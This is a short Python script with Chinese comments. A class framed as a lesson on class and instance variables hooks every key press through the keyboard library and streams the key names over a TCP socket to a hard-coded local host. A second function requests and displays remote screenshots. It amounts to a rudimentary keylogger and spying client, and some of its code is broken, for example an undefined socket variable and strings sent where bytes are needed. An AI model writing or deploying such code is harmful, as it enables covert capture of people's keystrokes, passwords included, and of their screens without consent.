import socket
from PIL import Image
from io import BytesIO
import keyboard

class MyClass:
    # 类变量，属于类本身，所有实例共享
    class_variable = 'I am a class variable'

    def __init__(self, name):
        # 实例变量，属于每个实例
        self.name = name
        self.s = None

    def instance_method(self):
        # 实例方法，可以访问实例变量和类变量
        print(f'The instance method is called on {self.name}')
        print(f'Class variable: {MyClass.class_variable}')

    def on_key_event(self,event):
        print(event.name)
        self.s.sendall(event.name)
        if event.event_type == 'down' and event.name == 'ctrl+shift+a':
            print('Ctrl+Shift+A 组合键被按下了。')

    def start_client(self,host, port):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as self.s:
            self.s.connect((host, port))

            keyboard.on_press(self.on_key_event)
            # 保持程序运行，以便监听快捷键
            keyboard.wait('esc')  # 按Esc键退出程序




def 截图啊():
    # 发送截图命令
    cmd = '截图'.encode('utf-8')
    # s.sendall(len(cmd).to_bytes(4, 'big'))
    s.sendall(cmd)

    # 接收图片大小
    size_bytes = s.recv(4)
    if len(size_bytes) != 4:
        print("接收到的图片大小信息不完整")
        return

    size = int.from_bytes(size_bytes, 'big')
    img_data = b''

    # 确保接收到完整的图片数据
    while len(img_data) < size:
        part = s.recv(size - len(img_data))
        if not part:
            print("图片数据接收不完整.")
            break
        img_data += part

    if len(img_data) == size:
        # 使用Pillow库将字节流转换为图片
        try:
            image = Image.open(BytesIO(img_data))
            # 显示图片
            image.show()
        except IOError as e:
            print(f"无法显示图片: {e}")
    else:
        print("接收到的图片数据不完整")




if __name__ == "__main__":
    # 创建类的实例
    my_instance = MyClass('Instance Name')

    my_instance.start_client(host='192.168.0.105', port=12345)




